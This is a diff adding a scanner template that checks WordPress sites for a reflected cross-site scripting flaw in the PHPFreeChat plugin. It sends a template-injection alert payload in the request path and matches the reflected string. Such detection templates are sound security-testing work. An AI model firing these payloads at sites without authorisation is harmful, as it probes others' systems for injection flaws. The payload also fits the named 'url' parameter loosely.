@@ -1,0 +1,29 @@
+id: xss-priv
+
+info:
+  name: WordPress Plugin PHPFreeChat - 'url' Reflected Cross-Site Scripting (XSS)
+  author: ibrahimhaxor
+  severity: medium
+  reference: https://www.securityfocus.com/bid/54332/info
+  tags: wordpress,xss,wp-plugin
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "%7B%7Bconstructor.constructor(%27alert(1337)%27)()%7D%7D"
+        part: body
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
